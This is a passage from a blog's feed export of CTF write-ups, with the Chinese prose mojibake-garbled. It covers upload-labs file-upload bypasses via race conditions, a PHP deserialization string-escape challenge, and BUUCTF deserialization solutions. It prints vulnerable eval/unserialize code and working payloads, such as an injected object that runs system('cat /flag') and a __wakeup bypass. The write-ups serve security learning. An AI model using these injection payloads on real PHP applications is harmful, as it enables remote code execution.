xx.jpg+xx.php&#x3D;xx.jpg<br>ä½¿ç”¨burpæŠ“åŒ…<br>è¿›è¡Œå‘é€</p>
<h3 id="ç¬¬åå…­å…³"><a href="#ç¬¬åå…­å…³" class="headerlink" title="ç¬¬åå…­å…³(?)"></a>ç¬¬åå…­å…³(?)</h3><p>äºŒæ¬¡æ¸²æŸ“</p>
<h3 id="ç¬¬åä¸ƒå…³"><a href="#ç¬¬åä¸ƒå…³" class="headerlink" title="ç¬¬åä¸ƒå…³"></a>ç¬¬åä¸ƒå…³</h3><p>æ¡ä»¶ç«äº‰<br>ä¸Šä¼ .phpæ–‡ä»¶<br>è¿›å…¥intruderè¿›è¡Œæ”»å‡»<br>ç„¶ååœ¨positionsä¸­å°†Â§<?php phpinfo();?>Â§ä¿®æ”¹ä¸ºÂ§<?php phpinfo();?>Â§1Â§<br>ç„¶åè¿›å…¥payloadsä¸­è¿›è¡Œå¾ªç¯æ”»å‡»10000æ¬¡<br>æœ€åç›´æ¥è¯¢é—®ç½‘ç«™</p>
<h3 id="ç¬¬åå…«å…³"><a href="#ç¬¬åå…«å…³" class="headerlink" title="ç¬¬åå…«å…³"></a>ç¬¬åå…«å…³</h3><p>å›¾ç‰‡å‹çš„æ¡ä»¶ç«äº‰<br>ä¸Šä¼ .jpgæ–‡ä»¶è¿›å…¥intruderè¿›è¡Œæ”»å‡»<br>ç„¶ååœ¨positionsä¸­å°†Â§<?php phpinfo();?>Â§ä¿®æ”¹ä¸ºÂ§<?php phpinfo();?>Â§1Â§<br>ç„¶åè¿›å…¥payloadsä¸­è¿›è¡Œå¾ªç¯æ”»å‡»10000æ¬¡<br>æœ€åç›´æ¥è¯¢é—®ç½‘ç«™</p>
<h3 id="ç¬¬åä¹å…³"><a href="#ç¬¬åä¹å…³" class="headerlink" title="ç¬¬åä¹å…³"></a>ç¬¬åä¹å…³</h3><p>è¯¥é¢˜åœ¨ç½‘é¡µä¸Šä¸ä»…å¯ä»¥ä¸Šä¼ æ–‡ä»¶è¿˜å¯ä»¥ä¿®æ”¹æ–‡ä»¶åç§°<br>ä¸Šä¼ .phpæ–‡ä»¶<br>ç„¶ååœ¨ç½‘é¡µä¸Šå°†æ–‡ä»¶åä¿®æ”¹ä¸º.PHPç„¶åè¿›è¡Œä¸Šä¼ <br>ç›´æ¥è®¿é—®ç½‘é¡µ</p>
<h3 id="ç¬¬äºŒåå…³"><a href="#ç¬¬äºŒåå…³" class="headerlink" title="ç¬¬äºŒåå…³(?)"></a>ç¬¬äºŒåå…³(?)</h3>]]></content>
  </entry>
  <entry>
    <title>ååºåˆ—åŒ–é€ƒé€¸</title>
    <url>/2022/12/31/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%80%83%E9%80%B8/</url>
    <content><![CDATA[<p>å­—ç¬¦å‡å°‘å‹</p>
<span id="more"></span>

<p>æºç æ˜¯</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserAccount</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$password</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">object_sleep</span>(<span class="params"><span class="variable">$str</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$ob</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;a*a&#x27;</span>, <span class="string">&#x27;@0@0@0@0@&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$ob</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">object_weakup</span>(<span class="params"><span class="variable">$ob</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$r</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;@0@0@0@0@&#x27;</span>, <span class="string">&#x27;a*a&#x27;</span>, <span class="variable">$ob</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$r</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">order</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$f</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hint</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;f);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$user</span> = <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">UserAccount</span>(<span class="variable">$username</span>, <span class="variable">$password</span>));</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">object_weakup</span>(<span class="title function_ invoke__">object_sleep</span>(<span class="variable">$user</span>))));</span><br></pre></td></tr></table></figure>

<p>åˆšæ‰“å¼€æœ‰ä¸€ä¸ªå›æ˜¾<code>object(UserAccount)#1 (2) &#123; [&quot;username&quot;:protected]=&gt; NULL [&quot;password&quot;:protected]=&gt; NULL &#125;</code></p>
<p>çœ‹åˆ°æœ€åæœ‰unserializeå‡½æ•°ï¼Œå¯ä»¥ååºåˆ—åŒ–ï¼Œååºåˆ—åŒ–å‰è¿˜æœ‰è‡ªå®šä¹‰çš„å‡½æ•°<code>object_weakup</code>å’Œ<code>object_sleep</code>ä¼šèµ·ä½œç”¨ï¼Œçœ‹ç€ä¸¤ä¸ªå‡½æ•°</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function object_sleep($str)</span><br><span class="line">&#123;</span><br><span class="line">    $ob = str_replace(&#x27;a*a&#x27;, &#x27;@0@0@0@0@&#x27;, $str);</span><br><span class="line">    return $ob;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function object_weakup($ob)</span><br><span class="line">&#123;</span><br><span class="line">    $r = str_replace(&#x27;@0@0@0@0@&#x27;, &#x27;a*a&#x27;, $ob);</span><br><span class="line">    return $r;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>object_sleep</code>ä¼šæŠŠ<code>a*a</code>æ¢ä¸º<code>@0@0@0@0@</code>ï¼Œè€Œ<code>object_weakup</code>ä¼šæŠŠ<code>@0@0@0@0@</code>æ¢ä¸º<code>a*a</code>å¦‚æœä¼ å…¥çš„æœ‰<code>a*a</code>ï¼Œé‚£ä¹ˆç»è¿‡è¿™ä¸¤ä¸ªå‡½æ•°çš„ä½œç”¨ä¼šç›¸äº’æŠµæ¶ˆï¼Œå°±æ²¡æœ‰ä»»ä½•ä½œç”¨ï¼Œä½†å¦‚æœä¼ å…¥çš„æ˜¯<code>@0@0@0@0@</code>ï¼Œ<code>object_sleep</code>å‡½æ•°å°±ä¸ä¼šèµ·ä½œç”¨ï¼Œè€Œæ˜¯<code>object_sleep</code>ä¼šèµ·ä½œç”¨ï¼Œä¼šä½¿å­—ç¬¦ä¸²å‡å°‘ï¼Œè¿™å°±å¯ä»¥ä½¿ç”¨ååºåˆ—åŒ–çš„å­—ç¬¦ä¸²é€ƒé€¸</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class order</span><br><span class="line">&#123;</span><br><span class="line">    public $f;</span><br><span class="line">    public $hint;</span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        eval($this-&gt;f);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$username = $_POST[&#x27;username&#x27;];</span><br><span class="line">$password = $_POST[&#x27;password&#x27;];</span><br><span class="line"></span><br><span class="line">$user = serialize(new UserAccount($username, $password));</span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯æˆ‘ä»¬å¯ä»¥åˆ©ç”¨çš„æ˜¯usernameå’Œpasswordï¼Œéœ€è¦é <code>eval($this-&gt;f);</code>æ¥è·å¾—flagï¼Œæ²¡åŠæ³•ç›´æ¥ç»™orderç±»çš„få±æ€§ä¼ å‚ï¼Œè¿™å°±éœ€è¦é å­—ç¬¦ä¸²é€ƒé€¸äº†</p>
<p>å…ˆè®²ä¸€ä¸‹å­—ç¬¦ä¸²å‡å°‘çš„é€ƒé€¸</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserAccount</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$password</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">object_weakup</span>(<span class="params"><span class="variable">$ob</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$r</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;@0@0@0@0@&#x27;</span>, <span class="string">&#x27;a*a&#x27;</span>, <span class="variable">$ob</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$r</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$user</span> = <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">UserAccount</span>(<span class="string">&#x27;@0@0@0@0@@0@0@0@0@@0@0@0@0@@0@0@0@0@@0@0@0@0@&#x27;</span>, <span class="string">&#x27;111&quot;;s:11:%00*%00password&quot;;s:3:&quot;123&quot;;&#125;&#x27;</span>));</span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$user</span>));</span><br><span class="line"><span class="keyword">echo</span> PHP_EOL;</span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">object_weakup</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$user</span>)));</span><br><span class="line"></span><br><span class="line">è¾“å‡º</span><br><span class="line">s:<span class="number">160</span>:<span class="string">&quot;O:11:&quot;</span>UserAccount<span class="string">&quot;:2:&#123;s:11:&quot;</span> * username<span class="string">&quot;;s:45:&quot;</span>@<span class="number">0</span>@<span class="number">0</span>@<span class="number">0</span>@<span class="number">0</span>@@<span class="number">0</span>@<span class="number">0</span>@<span class="number">0</span>@<span class="number">0</span>@@<span class="number">0</span>@<span class="number">0</span>@<span class="number">0</span>@<span class="number">0</span>@@<span class="number">0</span>@<span class="number">0</span>@<span class="number">0</span>@<span class="number">0</span>@@<span class="number">0</span>@<span class="number">0</span>@<span class="number">0</span>@<span class="number">0</span>@<span class="string">&quot;;s:11:&quot;</span> * password<span class="string">&quot;;s:38:&quot;</span><span class="number">111</span><span class="string">&quot;;s:11:%00*%00password&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;123&quot;</span>;&#125;<span class="string">&quot;;&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line">s:<span class="number">160</span>:<span class="string">&quot;O:11:&quot;</span>UserAccount<span class="string">&quot;:2:&#123;s:11:&quot;</span> * username<span class="string">&quot;;s:45:&quot;</span>a*aa*aa*aa*aa*a<span class="string">&quot;;s:11:&quot;</span> * password<span class="string">&quot;;s:38:&quot;</span><span class="number">111</span><span class="string">&quot;;s:11:%00*%00password&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;123&quot;</span>;&#125;<span class="string">&quot;;&#125;&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>æœ¬æ¥ç»™usernameèµ‹å€¼çš„æ˜¯<code>@0@0@0@0@@0@0@0@0@@0@0@0@0@@0@0@0@0@@0@0@0@0@</code>ï¼Œç»™passwordèµ‹å€¼çš„æ˜¯<code>111&quot;;s:11:%00*%00password&quot;;s:3:&quot;123&quot;;&#125;</code>ï¼Œä½†ç»è¿‡å­—ç¬¦ä¸²å‡å°‘çš„å‡½æ•°åusernameçš„å€¼å°±å˜æˆäº†<code>a*aa*aa*aa*aa*a&quot;;s:11:&quot; * password&quot;;s:38:&quot;111</code>ï¼Œpasswordçš„å€¼å°±æˆäº†123ï¼Œè€Œè¿™ä¸ª123å°±ç›¸å½“äºé€ƒé€¸å‡ºæ¥ï¼Œæˆ‘ä»¬å¯ä»¥è‡ªå·±æ§åˆ¶ï¼Œåªéœ€è¦æ”¹å˜<code>s:3:&quot;123&quot;;</code>è¿™é‡Œ</p>
<p>æ‰€ä»¥è¿™ä¸ªé¢˜å°±å¯ä»¥è®©åé¢é€ƒé€¸å‡ºæ¥ç»™få±æ€§è¿›è¡Œä¼ å‚ï¼Œéœ€è¦çš„få€¼æ˜¯<code>system(&quot;cat /flag&quot;);</code>ï¼Œéœ€è¦è®©passwordçš„å€¼ä¼ ä¸º<code>O:5:&quot;order&quot;:2:&#123;s:1:&quot;f&quot;;s:20:&quot;system(&quot;cat /flag&quot;);&quot;;s:4:&quot;hint&quot;;N;&#125;</code>ï¼Œè¿™æ ·å°±å¯ä»¥ç»™orderç±»ä¸­çš„få±æ€§è¿›è¡Œèµ‹å€¼ï¼Œä½†æ˜¯å¦‚æœç›´æ¥ç»™passwordä¼ è¿™ä¸ªå€¼</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">new UserAccount(&#x27;123&#x27;, &#x27;O:5:&quot;order&quot;:2:&#123;s:1:&quot;f&quot;;s:20:&quot;system(&quot;cat /flag&quot;);&quot;;s:4:&quot;hint&quot;;N;&#125;&#x27;)</span><br></pre></td></tr></table></figure>

<p>é‚£ä¹ˆåºåˆ—åŒ–ä¹‹ååªä¼šæŠŠè¿™ä¸ªå€¼å½“ä½œä¸€ä¸ªå­—ç¬¦ä¸²çœ‹å¾…ï¼Œä¸ä¼šæŠŠå®ƒå½“ä½œä¸€ä¸ªç±»ï¼Œéœ€è¦å°†è¿™ä¸ªå€¼å•ç‹¬é€ƒé€¸å‡ºæ¥</p>
<p>æœ€ç»ˆçš„payloadå¯ä»¥æ˜¯è¿™æ ·</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=@0@0@0@0@@0@0@0@0@@0@0@0@0@@0@0@0@0@@0@0@0@0@&amp;password=123&quot;;s:11:&quot;%00*%00password&quot;;O:5:&quot;order&quot;:2:&#123;s:1:&quot;f&quot;;s:20:&quot;system(&quot;cat /flag&quot;);&quot;;s:4:&quot;hint&quot;;N;&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™æ ·è¿›è¡Œå­—ç¬¦ä¸²å‡å°‘åå°±æˆäº†</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:11:&quot;UserAccount&quot;:2:&#123;s:11:&quot; * username&quot;;s:45:&quot;a*aa*aa*aa*aa*a&quot;;s:11:&quot; * password&quot;;s:93:&quot;123&quot;;s:11:&quot;%00*%00password&quot;;O:5:&quot;order&quot;:2:&#123;s:1:&quot;f&quot;;s:20:&quot;system(&quot;cat /flag&quot;);&quot;;s:4:&quot;hint&quot;;N;&#125;&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>å°±ç›¸å½“äºç»™usernameèµ‹å€¼äº†<code>a*aa*aa*aa*aa*a&quot;;s:11:&quot; * password&quot;;s:93:&quot;123</code>ï¼Œç»™passwordèµ‹å€¼äº†ä¸€ä¸ªç±»ï¼Œè€Œä¸æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œ<code>O:5:&quot;order&quot;:2:&#123;s:1:&quot;f&quot;;s:20:&quot;system(&quot;cat /flag&quot;);&quot;;s:4:&quot;hint&quot;;N;&#125;</code>è¢«å½“ä½œç±»æ¥å¤„ç†ä»è€Œç»™få±æ€§è¿›è¡Œèµ‹å€¼ï¼Œæœ€ååˆ©ç”¨<code>eval</code>æ¥å¾—åˆ°flag</p>
]]></content>
  </entry>
  <entry>
    <title>buuçš„ååºåˆ—åŒ–</title>
    <url>/2022/12/03/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/</url>
    <content><![CDATA[<p>[æå®¢å¤§æŒ‘æˆ˜ 2019]PHP	[MRCTF2020]Ezpop	[NPUCTF2020]ReadlezPHP	[ç½‘é¼æ¯ 2020 é’é¾™ç»„]AreUSerialz	[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]phpweb	[å®‰æ´µæ¯ 2019]easy_serialize_php	[SWPUCTF 2018]SimplePHP	[æå®¢å¤§æŒ‘æˆ˜ 2020]Greatphp</p>
<span id="more"></span>

<h3 id="æå®¢å¤§æŒ‘æˆ˜-2019-PHP"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-PHP" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]PHP"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]PHP</h3><p>1.æŸ¥çœ‹æºä»£ç å¯ä»€ä¹ˆéƒ½æŸ¥ä¸åˆ°ï¼Œç„¶åå°±å»æ‰¾äº†wpçœ‹å¯ä»¥ä½¿ç”¨dirsearchæ‰«æåˆ°<a href="http://www.zip,ç„¶åå°±ç›´æ¥æ‹¿æ¥ä½¿ç”¨åœ¨ç½‘å€é‚£è¾“å…¥`http//45e628f4-5673-4a23-b03a-8a245b9328ee.node4.buuoj.cn:81/www.zip%60%E7%84%B6%E5%90%8E%E4%B8%8B%E8%BD%BD%E4%BA%86%E4%B8%80%E4%B8%AA%E6%96%87%E4%BB%B6%EF%BC%8C%E9%87%8C%E9%9D%A2%E6%9C%89%E8%BF%99%E9%81%93%E9%A2%98%E7%9A%84%E6%BA%90%E4%BB%A3%E7%A0%81">www.zipï¼Œç„¶åå°±ç›´æ¥æ‹¿æ¥ä½¿ç”¨åœ¨ç½‘å€é‚£è¾“å…¥`http://45e628f4-5673-4a23-b03a-8a245b9328ee.node4.buuoj.cn:81/www.zip`ç„¶åä¸‹è½½äº†ä¸€ä¸ªæ–‡ä»¶ï¼Œé‡Œé¢æœ‰è¿™é“é¢˜çš„æºä»£ç </a></p>
<ol start="2">
<li></li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class.php</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">include &#x27;flag.php&#x27;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class Name&#123;</span><br><span class="line">    private $username = &#x27;nonono&#x27;;</span><br><span class="line">    private $password = &#x27;yesyes&#x27;;</span><br><span class="line"></span><br><span class="line">    public function __construct($username,$password)&#123;</span><br><span class="line">        $this-&gt;username = $username;</span><br><span class="line">        $this-&gt;password = $password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __wakeup()&#123;</span><br><span class="line">        $this-&gt;username = &#x27;guest&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __destruct()&#123;</span><br><span class="line">        if ($this-&gt;password != 100) &#123;</span><br><span class="line">            echo &quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;;</span><br><span class="line">            echo &quot;You name is: &quot;;</span><br><span class="line">            echo $this-&gt;username;echo &quot;&lt;/br&gt;&quot;;</span><br><span class="line">            echo &quot;You password is: &quot;;</span><br><span class="line">            echo $this-&gt;password;echo &quot;&lt;/br&gt;&quot;;</span><br><span class="line">            die();</span><br><span class="line">        &#125;</span><br><span class="line">        if ($this-&gt;username === &#x27;admin&#x27;) &#123;</span><br><span class="line">            global $flag;</span><br><span class="line">            echo $flag;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo &quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;;</span><br><span class="line">            die();</span><br><span class="line"></span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">index.php</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">  &lt;title&gt;I have a cat!&lt;/title&gt;</span><br><span class="line">  &lt;link rel=&quot;stylesheet&quot; href=&quot;https://cdnjs.cloudflare.com/ajax/libs/meyer-reset/2.0/reset.min.css&quot;&gt;</span><br><span class="line">      &lt;link rel=&quot;stylesheet&quot; href=&quot;style.css&quot;&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">    #login&#123;   </span><br><span class="line">        position: absolute;   </span><br><span class="line">        top: 50%;   </span><br><span class="line">        left:50%;   </span><br><span class="line">        margin: -150px 0 0 -150px;   </span><br><span class="line">        width: 300px;   </span><br><span class="line">        height: 300px;   </span><br><span class="line">    &#125;   </span><br><span class="line">    h4&#123;   </span><br><span class="line">        font-size: 2em;   </span><br><span class="line">        margin: 0.67em 0;   </span><br><span class="line">    &#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;div id=&quot;world&quot;&gt;</span><br><span class="line">    &lt;div style=&quot;text-shadow:0px 0px 5px;font-family:arial;color:black;font-size:20px;position: absolute;bottom: 85%;left: 440px;font-family:KaiTi;&quot;&gt;å› ä¸ºæ¯æ¬¡çŒ«çŒ«éƒ½åœ¨æˆ‘é”®ç›˜ä¸Šä¹±è·³ï¼Œæ‰€ä»¥æˆ‘æœ‰ä¸€ä¸ªè‰¯å¥½çš„å¤‡ä»½ç½‘ç«™çš„ä¹ æƒ¯</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;div style=&quot;text-shadow:0px 0px 5px;font-family:arial;color:black;font-size:20px;position: absolute;bottom: 80%;left: 700px;font-family:KaiTi;&quot;&gt;ä¸æ„§æ˜¯æˆ‘ï¼ï¼ï¼</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;div style=&quot;text-shadow:0px 0px 5px;font-family:arial;color:black;font-size:20px;position: absolute;bottom: 70%;left: 640px;font-family:KaiTi;&quot;&gt;</span><br><span class="line">    &lt;?php</span><br><span class="line">    include &#x27;class.php&#x27;;</span><br><span class="line">    $select = $_GET[&#x27;select&#x27;];</span><br><span class="line">    $res=unserialize(@$select);</span><br><span class="line">    ?&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;div style=&quot;position: absolute;bottom: 5%;width: 99%;&quot;&gt;&lt;p align=&quot;center&quot; style=&quot;font:italic 15px Georgia,serif;color:white;&quot;&gt; Syclover @ cl4y&lt;/p&gt;&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;script src=&#x27;http://cdnjs.cloudflare.com/ajax/libs/three.js/r70/three.min.js&#x27;&gt;&lt;/script&gt;</span><br><span class="line">&lt;script src=&#x27;http://cdnjs.cloudflare.com/ajax/libs/gsap/1.16.1/TweenMax.min.js&#x27;&gt;&lt;/script&gt;</span><br><span class="line">&lt;script src=&#x27;https://s3-us-west-2.amazonaws.com/s.cdpn.io/264161/OrbitControls.js&#x27;&gt;&lt;/script&gt;</span><br><span class="line">&lt;script src=&#x27;https://s3-us-west-2.amazonaws.com/s.cdpn.io/264161/Cat.js&#x27;&gt;&lt;/script&gt;</span><br><span class="line">&lt;script  src=&quot;index.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>3.æ„Ÿè§‰é‡è¦çš„å°±è¿™ä¸¤ä¸ªæ–‡ä»¶ï¼Œå…¶å®è¿˜æœ‰ä¸€ä¸ªflag.phpæ–‡ä»¶ï¼Œä½†é‡Œé¢çš„flagæ˜¯å‡çš„ï¼Œç„¶ååœ¨index.phpçœ‹åˆ°äº†ååºåˆ—åŒ–å‡½æ•°ï¼Œå¯ä»¥ç”¨selectä¼ å‚ï¼Œåœ¨class.phpæ–‡ä»¶ä¸­çŸ¥é“äº†æˆ‘ä»¬éœ€è¦è®©usernameç­‰äºadminï¼Œè®©passwordç­‰äº100ï¼Œæ‰å¯ä»¥è®©echo $flag;æ‰§è¡Œ</p>
<p>4.åŒæ—¶åˆçœ‹åˆ°äº†__wakeup()é­”æœ¯æ–¹æ³•ï¼Œéœ€è¦ç»•è¿‡å®ƒï¼Œå¦åˆ™usernameå°±ä¼šè¢«èµ‹å€¼ä¸ºguest</p>
<p>5.æ ¹æ®è¿™äº›æ¥æ„é€ payloadï¼Œä½¿ç”¨phpæ¥å°†éœ€è¦çš„å…ˆåºåˆ—åŒ–</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Name</span><br><span class="line">&#123;</span><br><span class="line">    private $username = &#x27;admin&#x27;;</span><br><span class="line">    private $password = &#x27;100&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">$a=new Name();</span><br><span class="line">print_r(serialize($a));</span><br><span class="line"></span><br><span class="line">è¾“å‡º</span><br><span class="line">O:4:&quot;Name&quot;:2:&#123;s:14:&quot; Name username&quot;;s:5:&quot;admin&quot;;s:14:&quot; Name password&quot;;s:3:&quot;100&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>6.å› ä¸ºurlæ— æ³•è§£æâ€æ‰€ä»¥ç”¨%22ä»£æ›¿ï¼Œå› ä¸ºNameåé¢å’Œå‰é¢éƒ½æœ‰ç©ºï¼Œç©ºå°±ç”¨%00ä»£æ›¿</p>
<p>7.payloadå°±æˆäº†</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:4:%22Name%22:2:&#123;s:14:%22%00Name%00username%22;s:5:%22admin%22;s:14:%22%00Name%00password%22;s:3:%22100%22;&#125;</span><br></pre></td></tr></table></figure>

<p>8.è¿˜éœ€è¦ç»•è¿‡__wakeup()ï¼Œæœ€åpayloadå°±æˆäº†</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?select=O:4:%22Name%22:3:&#123;s:14:%22%00Name%00username%22;s:5:%22admin%22;s:14:%22%00Name%00password%22;s:3:%22100%22;&#125;</span><br></pre></td></tr></table></figure>

<h3 id="MRCTF2020-Ezpop"><a href="#MRCTF2020-Ezpop" class="headerlink" title="[MRCTF2020]Ezpop"></a>[MRCTF2020]Ezpop</h3><p>1.æ‰“å¼€é¡µé¢æ˜¾ç¤ºæºä»£ç ä¸º</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Welcome to index.php</span><br><span class="line">&lt;?php</span><br><span class="line">//flag is in flag.php</span><br><span class="line">//WTF IS THIS?</span><br><span class="line">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span><br><span class="line">//And Crack It!</span><br><span class="line">class Modifier &#123;</span><br><span class="line">    protected  $var;</span><br><span class="line">    public function append($value)&#123;</span><br><span class="line">        include($value);</span><br><span class="line">    &#125;</span><br><span class="line">    public function __invoke()&#123;</span><br><span class="line">        $this-&gt;append($this-&gt;var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Show&#123;</span><br><span class="line">    public $source;</span><br><span class="line">    public $str;</span><br><span class="line">    public function __construct($file=&#x27;index.php&#x27;)&#123;</span><br><span class="line">        $this-&gt;source = $file;</span><br><span class="line">        echo &#x27;Welcome to &#x27;.$this-&gt;source.&quot;&lt;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        return $this-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span 